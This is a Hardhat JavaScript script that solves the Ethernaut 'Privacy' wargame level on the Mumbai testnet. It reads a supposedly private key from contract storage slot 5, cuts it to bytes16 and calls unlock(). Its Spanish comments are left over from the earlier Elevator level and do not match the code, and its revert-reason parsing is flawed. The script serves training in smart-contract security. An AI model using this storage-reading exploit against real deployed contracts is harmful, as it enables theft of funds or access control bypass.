const { ethers } = require("hardhat")
const {
  abi: ABIPrivacy,
} = require("../../artifacts/contracts/12/Privacy.sol/Privacy.json")
require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
/* @remind Es lioso. Hay que crear un contrat "MyBuilding" que llame a "Elevator" y este volvera a llamar de vuelta a "MyBuilding" */
/* despues, el uint no sirve para nada. ya que se llama dos veces a la funcion isLastFloor(uint) con el mismo parametro uint y
la 1era vez deve devolver false y la segunda vez true
*/
async function main() {
  const ethernautInstance = "0xbE17A1334892a60bdE0514984607981993f12673"
  /* instance */
  const PrivacyContract = new ethers.Contract(
    ethernautInstance,
    ABIPrivacy,
    /* @remind hemos integrado ya el signer */
    signer
  )

  /* slot 5, contado en el SM */
  const _bytes32 = await provider.getStorageAt(ethernautInstance, 5) // provider.getStorageAt(ADDRESS, SLOT)
  console.log("_bytes32", _bytes32)
  /* we need bytes16 */
  /* bytes32 = '0x2092817fdcc05db2a7f48d7f601af9b7370bbe2afcb19050cd41c874bec8a30c' */
  /* para convertir a bytes16 -> '0x' + cada byte coje 2 caracteres */
  const _bytes16 = _bytes32.slice(0, 2 + 16 * 2)
  console.log("_bytes16", _bytes16)

  /* callElevatorInstance */
  const tx = await PrivacyContract.unlock(_bytes16, {
    gasLimit: 10000000,
  })

  const res = await tx.wait()
  if (res.status === 0) {
    console.log("Transaction failed")

    // Retrieve the revert reason from the res if available
    if (res.logs && res.logs.length > 0) {
      const errorLog = res.logs.find((log) => log.topics[0] === "0x08c379a0") // Keccak hash of "Error(string)"
      if (errorLog) {
        const errorData = errorLog.data
        const reason = ethers.utils.toUtf8String(errorData.slice(4)) // Removing the 4-byte selector
        console.log("Revert reason:", reason)
      }
    }
  } else if (res.status === 1) {
    console.log("Transaction succeeded")
  }
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/12/DeployAndCall__Attack.js --network mumbai
*/
